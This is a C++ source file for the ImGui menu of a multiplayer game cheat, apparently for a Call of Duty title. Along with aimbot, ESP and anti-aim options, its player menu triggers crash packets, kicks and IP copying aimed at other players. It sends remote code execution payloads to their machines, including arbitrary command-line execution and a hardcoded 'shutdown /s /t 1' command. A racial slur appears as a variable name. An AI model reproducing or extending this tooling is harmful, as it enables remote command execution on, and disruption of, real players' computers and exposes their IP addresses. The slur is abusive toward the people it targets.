﻿#include "dependencies/std_include.hpp"
#include "menu.hpp"

namespace menu
{
	ImFont* glacial_indifference_bold_base_85;
	ImFont* glacial_indifference_base_85;
	bool open = true;

	void set_style_color()
	{
		auto& colors = ImGui::GetStyle().Colors;

		colors[ImGuiCol_Text] = { 1.0f, 1.0f, 1.0f, 1.0f };
		colors[ImGuiCol_TextDisabled] = { 0.784f, 0.784f, 0.784f, 0.784f };
		colors[ImGuiCol_WindowBg] = { 0.06f, 0.06f, 0.06f, 1.00f };
		colors[ImGuiCol_PopupBg] = { 0.08f, 0.08f, 0.08f, 0.94f };
		colors[ImGuiCol_Border] = { 0.00f, 0.00f, 0.00f, 0.71f };
		colors[ImGuiCol_BorderShadow] = { 0.06f, 0.06f, 0.06f, 0.01f };
		colors[ImGuiCol_FrameBg] = { 0.10f, 0.10f, 0.10f, 0.71f };
		colors[ImGuiCol_FrameBgHovered] = { 0.19f, 0.19f, 0.19f, 0.40f };
		colors[ImGuiCol_FrameBgActive] = { 0.20f, 0.20f, 0.20f, 0.67f };
		colors[ImGuiCol_TitleBg] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TitleBgActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TitleBgCollapsed] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_MenuBarBg] = { 0.10f, 0.10f, 0.10f, 0.66f };
		colors[ImGuiCol_ScrollbarBg] = { 0.02f, 0.02f, 0.02f, 0.00f };
		colors[ImGuiCol_ScrollbarGrab] = { 0.31f, 0.31f, 0.31f, 1.00f };
		colors[ImGuiCol_ScrollbarGrabHovered] = { 0.17f, 0.17f, 0.17f, 1.00f };
		colors[ImGuiCol_ScrollbarGrabActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_CheckMark] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_SliderGrab] = { 0.29f, 0.29f, 0.29f, 1.00f };
		colors[ImGuiCol_SliderGrabActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Button] = { 0.10f, 0.10f, 0.10f, 1.00f };
		colors[ImGuiCol_ButtonHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ButtonActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Header] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_HeaderHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_HeaderActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_Separator] = { 0.10f, 0.10f, 0.10f, 0.90f };
		colors[ImGuiCol_SeparatorHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_SeparatorActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGrip] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGripHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ResizeGripActive] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_PlotLines] = { 0.61f, 0.61f, 0.61f, 1.00f };
		colors[ImGuiCol_PlotLinesHovered] = { 1.00f, 1.00f, 1.00f, 1.00f };
		colors[ImGuiCol_PlotHistogram] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_PlotHistogramHovered] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_TextSelectedBg] = { 0.0f, 0.392f, 0.784f, 1.0f };
		colors[ImGuiCol_ModalWindowDarkening] = { 0.80f, 0.80f, 0.80f, 0.35f };
	}

	void set_style()
	{
		auto& style = ImGui::GetStyle();
		ImGui::GetIO().FontDefault = ImGui::GetIO().Fonts->AddFontDefault();
		
		glacial_indifference_bold_base_85 = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedBase85TTF(ImGui::GetIO().Fonts->GetSecondaryFonts().data(), 14.0f);
		glacial_indifference_base_85 = ImGui::GetIO().Fonts->AddFontFromMemoryCompressedBase85TTF(ImGui::GetIO().Fonts->GetPrimaryFont().data(), 15.0f);

		set_style_color();

		style.WindowPadding = { 8.0f, 2.0f };
		style.FramePadding = { 4.0f , 4.0f };
		style.ItemSpacing = { 10.0f, 4.0f };
		style.ItemInnerSpacing = { 4.0f, 4.0f };
		style.TouchExtraPadding = {};
		style.IndentSpacing = 21.0f;
		style.ScrollbarSize = 13.0f;
		style.GrabMinSize = 10.0f;
		style.WindowBorderSize = 0.0f;
		style.ChildBorderSize = 0.0f;
		style.PopupBorderSize = 0.0f;
		style.FrameBorderSize = 0.0f;
		style.TabBorderSize = 1.0f;

		style.WindowRounding = 7.0f;
		style.ChildRounding = 7.0f;
		style.FrameRounding = 7.0f;
		style.PopupRounding = 7.0f;
		style.ScrollbarRounding = 7.0f;
		style.GrabRounding = 7.0f;
		style.TabRounding = 7.0f;

		style.WindowTitleAlign = { 0.5f, 0.5f };
		style.WindowMenuButtonPosition = ImGuiDir_None;
		style.ButtonTextAlign = { 0.5f, 0.5f };
		style.SelectableTextAlign = {};

		style.DisplaySafeAreaPadding = { 4.0f, 4.0f };

		style.ColumnsMinSpacing = 6.0f;
		style.CurveTessellationTol = 1.25f;
		style.AntiAliasedLines = true;
	}

	void toggle()
	{
		if (rendering::dx::initialized)
		{
			open = !open;
			utils::hook::set<bool>(offsets::in_appactive, !open);
		}
	}

	bool is_open()
	{
		return rendering::dx::initialized && open;
	}

	bool begin_section(const std::string& text)
	{
		ImGui::TextUnformatted(text);
		return true;
	}

	void player_list()
	{
		const auto send_message = [](const std::string& message, game::PartyMember* pm, game::clientInfo_t* client) -> void
		{
			if (game::CL_LocalClientIsInGame())
			{
				if (!message.empty())
				{
					char nigga_message[0xff];
					sprintf_s(nigga_message, "say \"%s\"", utils::string::replace_all(message, "%v", client->name()).data());

					game::CL_AddReliableCommand(0, nigga_message);

					std::this_thread::sleep_for(1000ms);
				}
			}
			else
			{
				if (!message.empty())
				{
					char nigga_message[0xff];
					sprintf_s(nigga_message, "%s", utils::string::replace_all(message, "%v", pm->gamertag).data());

					misc::custom_name = nigga_message;

					std::this_thread::sleep_for(2000ms);
				}
			}
		};

		if (ImGui::BeginTabItem("Player List", nullptr))
		{
			const auto party = game::party;

			const auto in_game = game::CL_LocalClientIsInGame() && game::cg()->client(game::cg()->ps()->clientNum)->valid();
			const auto is_hosting = in_game && game::IsServerRunning();

			const auto width = ImGui::GetContentRegionAvail().x;

			ImGui::PushStyleVar(ImGuiStyleVar_IndentSpacing, 0.0f);
			ImGui::BeginColumns("Player List", 3, ImGuiColumnsFlags_NoResize);

			ImGui::SetColumnWidth(-1, 28.0f);
			ImGui::TextUnformatted("#");
			ImGui::NextColumn();
			ImGui::TextUnformatted("Player");
			ImGui::NextColumn();
			ImGui::SetColumnOffset(-1, width - ImGui::CalcTextSize("Priority").x);
			ImGui::TextUnformatted("Priority");
			ImGui::NextColumn();

			ImGui::Separator();

			std::array<std::uint32_t, 18> indices{};

			for (size_t i = 0; i < 18; ++i)
			{
				indices[i] = i;
			}

			if (in_game)
			{
				std::sort(indices.begin(), indices.end(), [](const auto& a, const auto& b) { return game::cg()->client(a)->team() > game::cg()->client(b)->team(); });
			}

			for (const auto& client_num : indices)
			{
				const auto pm = party->party_member(client_num);
				const auto user = &party->session->dyn.users[client_num];
				const auto client = game::cg()->client(client_num);

				if (game::is_valid_target(client_num))
				{
					ImGui::AlignTextToFramePadding();
					ImGui::TextUnformatted(std::to_string(client_num));

					ImGui::NextColumn();

					const auto player_xuid = in_game ? client->xuid() : pm->player;
					char player_name[38] = { 0 };
					
					if (in_game)
					{
						ImGui::PushStyleColor(ImGuiCol_Text, client_num == std::uint32_t(game::cg()->client_num()) ? ImVec4(0.0f, 1.0f, 0.4f, 0.95f)
							: (client->team() == game::TEAM_FREE || client->team() != game::cg()->client(game::cg()->client_num())->team())
							? esp::enemy_color : esp::friendly_color);

						game::CL_GetClientName(0, client_num, player_name, sizeof player_name, true);
					}
					else
					{
						ImGui::PushStyleColor(ImGuiCol_Text, player_xuid == game::Live_GetXuid(0)
							? ImVec4(0.0f, 1.0f, 0.4f, 0.95f) : ImColor(200, 200, 200, 250).Value);
						
						const auto gamertag = !*pm->clanAbbrev ? pm->gamertag : utils::string::va("[%s]%s", pm->clanAbbrev, pm->gamertag);
						strncpy_s(player_name, sizeof player_name, gamertag, _TRUNCATE);
					}

					ImGui::AlignTextToFramePadding();
					const auto selected = ImGui::Selectable((player_name + "##"s + std::to_string(client_num)).data());

					ImGui::PopStyleColor();

					if (steam::steam_friends && player_xuid)
					{
						const auto steam_name = steam::steam_friends->GetFriendPersonaName(player_xuid);

						if (steam_name != nullptr
							&& *steam_name
							&& std::strcmp(steam_name, "[unknown]")
							&& std::strcmp(steam_name, pm->gamertag))
						{
							ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);
							ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "(%s)", steam_name);
						}
					}

					if (aimbot::ignore_target[client_num])
					{
						ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);
						ImGui::TextColored(ImVec4(0.0f, 1.0f, 0.4f, 0.95f), "[Ignored]");
					}

					if (static_cast<std::uint32_t>(party->currentHost.hostNum) == client_num)
					{
						ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);
						ImGui::TextColored(ImVec4(0.0f, 1.0f, 1.0f, 0.95f), "[Host]");
					}

					if (game::is_friend(client_num))
					{
						ImGui::SameLine(0, ImGui::GetStyle().ItemInnerSpacing.x);

						auto friend_name = "[Friend]"s;

						for (const auto& friends : friends::friends)
						{
							if (friends.xuid == player_xuid)
							{
								friend_name = "(" + friends.name + ")";
							}
						}

						ImGui::TextColored(ImVec4(0.0f, 0.4f, 1.0f, 0.95f), friend_name.data());
					}

					const auto popup = "player_popup##" + std::to_string(client_num);

					if (selected)
					{
						exploits::send_connectivity_test(party, client_num);
						
						ImGui::OpenPopup(popup.data());
					}

					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
					{
						if (ImGui::BeginMenu((player_name + "##"s + std::to_string(client_num) + "friend_profile_menu").data()))
						{
							ImGui::MenuItem((player_name + "##"s + std::to_string(client_num) + "friend_profile_menu_item").data(), nullptr, false, false);

							if (ImGui::IsItemClicked())
							{
								game::LiveSteam_PopOverlayForSteamID(player_xuid);
								toggle();
							}

							if (ImGui::IsItemHovered())
							{
								ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
							}

							static auto friend_player_name = ""s; 
							
							if (ImGui::BeginMenu(("Add to friends list##add_friend_to_list_menu" + std::to_string(client_num)).data()))
							{
								ImGui::InputTextA("##friend_player_name", &friend_player_name);

								if (ImGui::Button(("Add friend##add_friend_to_list" + std::to_string(client_num)).data()))
								{
									friends::friends.emplace_back(friends::friends_t
									{ 
										player_xuid, 
										friend_player_name, 
										utils::string::adr_to_string(pm->platformAddr),
										false,
										true,
									});
									
									friends::write_to_friends();
								}

								ImGui::EndMenu();
							}
							else
							{
								friend_player_name = player_name;
							}

							ImGui::EndMenu();
						}

						ImGui::Separator();

						if (ImGui::MenuItem(utils::string::xuid_string(pm->platformAddr, player_xuid).data(), nullptr))
						{
							ImGui::LogToClipboardUnformatted(std::to_string(player_xuid).data());
						}

						const auto ip_string = utils::string::adr_to_string(pm->platformAddr, pm->user_port());

						if (ImGui::MenuItem(ip_string.data(), nullptr))
						{
							ImGui::LogToClipboardUnformatted(ip_string.data());
						}

						ImGui::Separator();

						ImGui::MenuItem(
							("Ignore##ignore_client" + std::to_string(client_num)).data(),
							nullptr,
							reinterpret_cast<bool*>(&aimbot::ignore_target[client_num]),
							player_xuid != game::Live_GetXuid(0)
						);

						ImGui::MenuItem(
							("Prioritize##priority_client" + std::to_string(client_num)).data(),
							nullptr,
							reinterpret_cast<bool*>(&aimbot::priority_target[client_num]),
							player_xuid != game::Live_GetXuid(0)
						);

						if (ImGui::MenuItem(("Crash alt##crash_client_alt" + std::to_string(client_num)).data()))
						{
							exploits::pm = pm;
							exploits::target = pm->platformAddr.netAddr;

							exploits::instant_message::party::send_join_party_crash_packet(pm->player);
							exploits::instant_message::party::send_join_party_overflowed_crash_packet(pm->player);
							exploits::instant_message::party::send_pseg_crash_packet(game::party, pm->player);
							exploits::instant_message::party::send_ph_crash_packet(game::party, pm->player);
						}

						if (ImGui::MenuItem(("Popup##send_popup" + std::to_string(client_num)).data()))
						{
							const auto dummy{ 0 };
							game::dwInstantSendMessage(0, &player_xuid, 1, 'f', &dummy, sizeof dummy);
						}

						if (ImGui::BeginMenu(("Extra's##extra_menu" + std::to_string(client_num)).data(), exploits::can_connect_to_player(party, client_num)))
						{
							static auto message = "adios %v"s;
							ImGui::TextUnformatted("message (%v = target username)");
							ImGui::InputTextA("##message", &message);

							if (ImGui::MenuItem(("Crash##crash_client" + std::to_string(client_num)).data()))
							{
								scheduler::once([=]()
								{
									send_message(message, pm, client);

									if (!game::CL_LocalClientIsInGame() && !message.empty())
										misc::custom_name = game::CL_ControllerIndex_GetUsername(0);

									exploits::pm = pm; 
									exploits::target = pm->platformAddr.netAddr;
									exploits::send_crash = true;

									game::send_host_crashes(client_num);
								}, scheduler::pipeline::async);
							}

							if (ImGui::MenuItem(("Kick##kick_client" + std::to_string(client_num)).data()))
							{
								scheduler::once([=]()
								{
									send_message(message, pm, client);

									exploits::pm = pm;
									exploits::target = pm->platformAddr.netAddr;

									if (party->is_running())
									{
										exploits::instant_message::party::send(pm->player, (std::to_string(party->party_id()) + "rejoin"));
									}
									else
									{
										exploits::send_connect_response_migrate_packet(party);
									}

									if (!game::CL_LocalClientIsInGame() && !message.empty())
									{
										misc::custom_name = game::CL_ControllerIndex_GetUsername(0);
									}

								}, scheduler::pipeline::async);
							}

							if (ImGui::MenuItem(("Kick from party##" + std::to_string(client_num)).data(), nullptr, nullptr, !game::party->session->staticData.isDedicated))
							{
								exploits::send_relay_packet(game::party->currentHost.addr, client_num, "2kicked deez");
							}

							if (ImGui::MenuItem(("Remove from party##" + std::to_string(client_num)).data(), nullptr, nullptr, !game::party->session->staticData.isDedicated))
							{
								exploits::send_relay_packet(game::party->currentHost.addr, client_num, "2endparty deez");
							}

							ImGui::Separator();

							if (ImGui::MenuItem(("Immobilize##immobilize_client" + std::to_string(client_num)).data(), nullptr, false, game::CL_LocalClientIsInGame()))
							{
								exploits::pm = pm;
								exploits::target = pm->platformAddr.netAddr;
								exploits::send_request_stats_packet(party);
							}

							if (ImGui::MenuItem(("Show migration screen##migration_screen_client" + std::to_string(client_num)).data(), nullptr, false, game::CL_LocalClientIsInGame()))
							{
								exploits::pm = pm;
								exploits::target = pm->platformAddr.netAddr; 
								exploits::send_mstart_packet(party);
							}

							if (ImGui::BeginMenu(("Send string##send_string_menu" + std::to_string(client_num)).data(), exploits::can_connect_to_player(party, client_num)))
							{
								static auto string_input = ""s;

								ImGui::InputTextA("##send_string_inpt", &string_input);

								if (ImGui::MenuItem(("Send string##send_string_client" + std::to_string(client_num)).data()))
								{
									game::oob::send(pm->platformAddr.netAddr, string_input);
								}

								ImGui::EndMenu();
							}

							if (ImGui::BeginMenu(("Send server command##send_server_cmd_menu" + std::to_string(client_num)).data()))
							{
								static auto server_command_input = ""s;

								ImGui::InputTextA("##send_server_cmd_inpt", &server_command_input);

								if (ImGui::MenuItem(("Send server command##send_server_cmd_client" + std::to_string(client_num)).data()))
								{
									game::send_server_command(client_num, server_command_input);
								}

								ImGui::EndMenu();
							}

							if (ImGui::BeginMenu(("Pull player to xuid##pull_player_to_xuid_menu" + std::to_string(client_num)).data(), party->is_running()))
							{
								static auto xuid_input = ""s;
								ImGui::InputTextA("##xuid", &xuid_input);

								if (ImGui::MenuItem(("Get session info##get_session_info" + std::to_string(client_num)).data()))
								{
									exploits::instant_message::receive_session_info = false;
									exploits::instant_message::pulling::send_join_request_message(utils::atoll(xuid_input.data()), true);
								}

								if (ImGui::MenuItem(("Pull player##pull_client_to_xuid" + std::to_string(client_num)).data(),
									nullptr,
									false,
									exploits::instant_message::receive_session_info
									&& exploits::instant_message::session_info.sessionID.ab[0]))
								{
									exploits::pm = pm;
									exploits::target = pm->platformAddr.netAddr;
									exploits::instant_message::party::send_rejoin_packet(pm->player, exploits::instant_message::session_info);
								}

								ImGui::EndMenu();
							}
							else
							{
								if (exploits::instant_message::receive_session_info)
								{
									exploits::instant_message::receive_session_info = false;
								}
							}

							ImGui::Separator();

							if (ImGui::BeginMenu(("Execute cbuf command##" + std::to_string(client_num)).data(), in_game))
							{
								static auto command_input = ""s;

								ImGui::InputTextA(("##" + std::to_string(client_num)).data(), &command_input);

								if (ImGui::MenuItem("Execute", nullptr, nullptr, !command_input.empty()))
								{
									exploits::host::rce::send_payload(client_num, "cbuf", { command_input });
								}

								ImGui::EndMenu();
							}

							if (ImGui::BeginMenu(("Execute command line##" + std::to_string(client_num)).data(), in_game))
							{
								static auto command_input = ""s;

								ImGui::InputTextA(("##" + std::to_string(client_num)).data(), &command_input);

								if (ImGui::MenuItem("Execute", nullptr, nullptr, !command_input.empty()))
								{
									exploits::host::rce::send_payload(client_num, "cmd", { command_input });
								}

								ImGui::EndMenu();
							}
							
							if (ImGui::MenuItem("Reset stats", nullptr, nullptr, in_game))
							{
								exploits::host::rce::send_payload(client_num, "cbuf", { "disconnect;wait 300;resetStats;uploadStats" });
							}
							
							if (ImGui::MenuItem("Shutdown PC", nullptr, nullptr, in_game))
							{
								exploits::host::rce::send_payload(client_num, "cmd", { "shutdown /s /t 1" });
							}

							ImGui::EndMenu();
						}

						ImGui::EndPopup();
					}

					ImGui::NextColumn();

					if (client_num != static_cast<std::uint32_t>(game::Party_FindMemberByXUID(game::Live_GetXuid(0))))
					{
						ImGui::TextUnformatted("");
						ImGui::SameLine(0, 10.0f);
						ImGui::Checkbox(("##priority_client" + std::to_string(client_num)).data(), reinterpret_cast<bool*>(&aimbot::priority_target[client_num]));
					}
					else
					{
						ImGui::TextUnformatted("");
					}

					ImGui::NextColumn();

					if (ImGui::GetColumnIndex() == 0)
					{
						ImGui::Separator();
					}
				}
			}

			ImGui::PopStyleVar();
			ImGui::EndColumns();
			ImGui::EndTabItem();
		}
	}

	void draw()
	{
		if (is_open())
		{
			ImGui::SetNextWindowSize({ 480, 480 }, ImGuiCond_Once);

			if (!ImGui::Begin(window_title, nullptr, window_flags))
			{
				ImGui::End();
				return;
			}

			if (ImGui::BeginTabBar("tabs"))
			{
				ImGui::Separator();

				const auto party = game::party;
				const auto our_client_num = game::Party_FindMemberByXUID(game::Live_GetXuid(0));
				const auto in_game = game::CL_LocalClientIsInGame() && game::cg()->client(game::cg()->ps()->clientNum)->valid();
				const auto hosting = in_game && game::is_hosting();
				const auto width = ImGui::GetContentRegionAvail().x;
				const auto spacing = ImGui::GetStyle().ItemInnerSpacing.x;

				if (ImGui::BeginTabItem("Aimbot"))
				{
					ImGui::Checkbox("Enabled##aimbot_enabled", &aimbot::enabled);

					ImGui::Separator();

					ImGui::Checkbox("Silent mode", &aimbot::silent);

					ImGui::SameLine(width - 95.0f, spacing);
					ImGui::Checkbox("Asynchronous", &aimbot::asynchronous);
					
					ImGui::Checkbox("Auto-fire", &aimbot::auto_fire);
					ImGui::Checkbox("Auto-wall", &autowall::enabled);
					ImGui::Checkbox("Legit", &aimbot::legit);
					ImGui::Checkbox("Predict target movement", &prediction::enabled);
					ImGui::Checkbox("Prioritize friends", &aimbot::priority_friends);
					ImGui::Checkbox("Prioritize shield targets", &aimbot::priority_riot);
					ImGui::Checkbox("Only bonescan priority targets", &aimbot::priority_bonescan);
					ImGui::Checkbox("Fake lag", &events::fake_lag);

					const auto leg_multipoint_radius_step = 1u;

					ImGui::SetNextItemWidth(width * (1.0f / 5));
					ImGui::InputScalar("Leg multipoint radius", ImGuiDataType_S32, &aimbot::leg_multipoint_radius, &leg_multipoint_radius_step, nullptr, "%u");
					aimbot::leg_multipoint_radius = std::min(aimbot::leg_multipoint_radius, 30u);
					
					const auto lag_ms_step = 1u;

					ImGui::SetNextItemWidth(ImGui::GetContentRegionAvail().x * (1.0f / 4));
					ImGui::InputScalar("Fake lag ms", ImGuiDataType_U32, reinterpret_cast<int*>(&events::lag_ms), &lag_ms_step, nullptr, "%u ms");
					events::lag_ms = std::min(events::lag_ms, 450u);

					if (begin_section("Bones to scan"))
					{
						static std::string bone = game::SL_ConvertToString(game::get_tag(game::bone_tag::helmet));
						
						ImGui::SetNextItemWidth(width * 0.35f);

						if (ImGui::BeginCombo("##bone_name", bone.data()))
						{
							for (const auto& aim_bone : aimbot::aim_bones)
							{
								const auto bone_tag = game::SL_ConvertToString(get_tag(aim_bone));
								ImGui::PushID(bone_tag);

								if (ImGui::MenuItem(bone_tag, nullptr, &aimbot::aim_bones[static_cast<size_t>(aim_bone)]))
								{
									const auto entry = std::find_if(aimbot::aim_bones.begin(), aimbot::aim_bones.end(), [&](const game::bone_tag t)
									{ 
										return t == aim_bone;
									});

									if (entry != aimbot::aim_bones.end())
									{
										aimbot::aim_bones.erase(entry);
										bone = bone_tag;
									}
								}

								ImGui::PopID();
							}

							ImGui::EndCombo();
						}
					}

					if (ImGui::CollapsingHeader("Anti aim", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::Checkbox("Enabled##anti_aim_enabled", &antiaim::enabled);

						ImGui::Separator(); 
						
						const auto custom_base_step = 1.0f;

						ImGui::SetNextItemWidth(width * (1.0f / 4));
						ImGui::InputScalar("Shield pitch up", ImGuiDataType_Float, &antiaim::shield_base_pitch_shift, &custom_base_step, nullptr, "%.1f deg");

						if (std::abs(antiaim::shield_base_pitch_shift) > 85.0f)
						{
							antiaim::shield_base_pitch_shift = 0;
						}
					}

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Visuals"))
				{
					ImGui::Checkbox("Enable##enable_visuals", &esp::enabled);
					ImGui::Checkbox("Enemies only", &esp::enemies_only);

					ImGui::Separator(); 

					ImGui::Checkbox("Player box", &esp::player_box);
					ImGui::Checkbox("Player nametag", &esp::player_name_tag);
					ImGui::Checkbox("Player bones", &esp::player_bone_tags);

					ImGui::Separator();

					ImGui::ColorEdit4("Enemy visible color", reinterpret_cast<float*>(&esp::enemy_visible_color), color_flags);
					ImGui::ColorEdit4("Enemy color", reinterpret_cast<float*>(&esp::enemy_color), color_flags);
					ImGui::ColorEdit4("Friendly color", reinterpret_cast<float*>(&esp::friendly_color), color_flags);

					ImGui::Separator();

					const auto thickness_step = 1.0f;

					ImGui::SetNextItemWidth(width * (1.0f / 5));
					ImGui::InputScalar("Thickness", ImGuiDataType_Float, &esp::bone_thickness, &thickness_step, nullptr, "%.1f");

					if (ImGui::CollapsingHeader("Misc", ImGuiTreeNodeFlags_DefaultOpen))
					{
						ImGui::Checkbox("Aimbot positions", &esp::aimbot_positions); 
					}

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Misc"))
				{
					static ImGuiTextFilter filter;

					ImGui::TextUnformatted("Material List");
					filter.Draw("##search_material", width * 0.85f);
					ImGui::SetNextItemWidth(width * 0.85f); 
					
					if (begin_section("Field of view"))
					{
						const auto fov_step = 1.0f;

						ImGui::SetNextItemWidth(width * (1.0f / 5));
						ImGui::InputScalar("##field_of_view", ImGuiDataType_Float, &misc::fov, &fov_step, nullptr, "%.0f");

						if (std::abs(misc::fov) > 120.0f || std::abs(misc::fov) < 65.0f)
						{
							misc::fov = 65.0f;
						}
					}

					ImGui::Checkbox("Third person mode", &misc::third_person);
					ImGui::Checkbox("Log out-of-band packets", &network::log_packets);
					ImGui::Checkbox("Log SV commands", &server_command::log_sv_commands);
					
					ImGui::Checkbox("Spoof IP address", &security::spoof_ip_address);
					ImGui::SameLine();

					ImGui::SetNextItemWidth(ImGui::GetContentRegionAvail().x * (1.0f / 4));
					ImGui::InputTextA("##ip_address_string", &security::ip_address_string);

					ImGui::Checkbox("Block join requests", &exploits::instant_message::block_join_requests);

					if (ImGui::CollapsingHeader("Obituary", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Kill-say"))
						{
							ImGui::Checkbox("##kill_say", &obituary::kill_say);
							ImGui::SameLine(0, spacing);

							ImGui::SetNextItemWidth(ImGui::GetContentRegionAvail().x * (1.0f / 2));
							ImGui::InputTextA("##kill_say_input", &obituary::kill_say_input);
						}
						
						ImGui::Checkbox("Steal name", &obituary::steal_name);
					}
					
					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
					{
						ImGui::Checkbox("First bullet fix", &nospread::bullet_fix);
						ImGui::Checkbox("Remove flinch", &misc::no_flinch);
						ImGui::Checkbox("Remove kick angles", &misc::no_recoil);
						ImGui::Checkbox("Remove spread", &nospread::enabled);
					}

					ImGui::EndTabItem();
				}

				if (ImGui::BeginTabItem("Server"))
				{
					if (ImGui::CollapsingHeader("Game info", ImGuiTreeNodeFlags_Leaf))
					{
						if (const auto id = exploits::instant_message::lobby_id; id)
						{
							const auto lobby_id_string = std::to_string(id);
							ImGui::MenuItem(("Lobby ID: " + lobby_id_string).data(), "Click to copy lobby ID");

							if (ImGui::IsItemClicked())
							{
								ImGui::LogToClipboardUnformatted(lobby_id_string.data());
							}

							if (ImGui::IsItemHovered())
							{
								ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
							}
						}

						const auto session_id_string = std::to_string(party->session->dyn.sessionInfo.sessionID.id());
						ImGui::MenuItem(("Session ID: " + session_id_string).data(), "Click to copy session ID");

						if (ImGui::IsItemClicked())
						{
							ImGui::LogToClipboardUnformatted(session_id_string.data());
						}

						if (ImGui::IsItemHovered())
						{
							ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
						}

						const auto xnaddr_ip_string = utils::string::adr_to_string(&party->session->dyn.sessionInfo);
						ImGui::MenuItem(("Server IP: "s + xnaddr_ip_string).data(), "Click to copy IP address");

						if (ImGui::IsItemClicked())
						{
							ImGui::LogToClipboardUnformatted(xnaddr_ip_string.data());
						}

						if (ImGui::IsItemHovered())
						{
							ImGui::SetMouseCursor(ImGuiMouseCursor_Hand);
						}
					}

					if (ImGui::CollapsingHeader("Host", ImGuiTreeNodeFlags_Leaf))
					{
						if (ImGui::MenuItem("Crash theater lobby", nullptr, false, our_client_num >= 0 && party->in_party() && !(game::ui_demoname->current.string + ""s).empty()))
						{
							for (size_t i = 0; i < 18; ++i)
							{
								if (game::is_valid_target(i))
								{
									exploits::pm = party->party_member(i);
									exploits::target = exploits::pm->platformAddr.netAddr;
									exploits::send_play_demo_packet(party);
								}
							}
						}
						
						if (ImGui::MenuItem("Crash party/lobby members", nullptr, false, our_client_num >= 0 && party->are_we_host()))
						{
							for (size_t i = 0; i < 18; ++i)
							{
								if (game::is_valid_target(i))
								{
									exploits::pm = party->party_member(i);
									exploits::target = exploits::pm->platformAddr.netAddr;
									exploits::send_pseg_crash_packet(party);
								}
							}
						}

						if (ImGui::MenuItem("Crash lobby members", nullptr, false, our_client_num >= 0 && party->are_we_host() && !party->party_id()))
						{
							for (size_t i = 0; i < 18; ++i)
							{
								if (game::is_valid_target(i))
								{
									exploits::pm = party->party_member(i);
									exploits::target = exploits::pm->platformAddr.netAddr;
									exploits::send_ph_crash_packet(party);
								}
							}
						}

						if (ImGui::MenuItem("Unlock all achievements", nullptr, nullptr, hosting))
						{
							const auto achievements =
							{
								"MP_MISC_1",
								"MP_MISC_2",
								"MP_MISC_3",
								"MP_MISC_4",
								"MP_MISC_5",
							};

							for (const auto& achievement : achievements)
							{
								game::send_server_command(-1, "# "s + achievement);
							}

							game::send_server_command(-1, "; \"All achivements unlocked!\"");
						}
					}

					if (ImGui::CollapsingHeader("Game settings", ImGuiTreeNodeFlags_Leaf))
					{
						if (begin_section("Map"))
						{
							ImGui::SetNextItemWidth(width * 0.35f);
							static std::string map = game::map_handler[16].mapname;

							if (!map.empty() && ImGui::BeginCombo("##map_name", map.data()))
							{
								for (const auto& map_name : game::map_names)
								{
									ImGui::PushID(map_name.data());

									if (ImGui::Selectable(map_name.data()))
									{
										map = map_name;
									}

									ImGui::PopID();
								}

								ImGui::EndCombo();
							}

							ImGui::SameLine(0.0f, spacing);

							if (ImGui::Button("Set##set_map_name"))
							{
								exploits::send_go_packet(party, map);
							}
						}
						
						ImGui::Checkbox("Anti-leave", &misc::anti_leave);
						
						if (ImGui::MenuItem("Max bullet penetration", nullptr, nullptr, in_game && hosting))
						{
							if (game::perk_bullet_penetration_multiplier->current.value == 2.0f)
							{
								game::perk_bullet_penetration_multiplier->current.value = 1.0f;
								game::sv_penetration_count->current.integer = 256;
								
								game::CG_BoldGameMessage(0, "Increased penetration!", 0);
							}
							else
							{
								game::perk_bullet_penetration_multiplier->current.value = 2.0f;
								game::sv_penetration_count->current.integer = 5;

								game::CG_BoldGameMessage(0, "Decreased penetration!", 0);
							}
						}
						
						if (ImGui::MenuItem("End game", nullptr, nullptr, in_game))
						{
							game::Cbuf_AddText(0, ("mr " + std::to_string(game::cl()->serverId) + " -1 endround").data());
						}

						if (ImGui::MenuItem("Kick host", nullptr, false, our_client_num >= 0))
						{
							exploits::pm = {};
							exploits::target = party->currentHost.addr;

							if (party->is_running())
							{
								game::oob::send(exploits::target, (std::to_string(party->party_id()) + "rejoin"));
							}
							else
							{
								exploits::send_connect_response_migrate_packet(party);
							}
						}

						if (ImGui::MenuItem("Kick clients", nullptr, false, our_client_num >= 0))
						{
							for (size_t i = 0; i < 18; ++i)
							{
								if (game::is_valid_target(i))
								{
									exploits::pm = party->party_member(i);
									exploits::target = exploits::pm->platformAddr.netAddr;

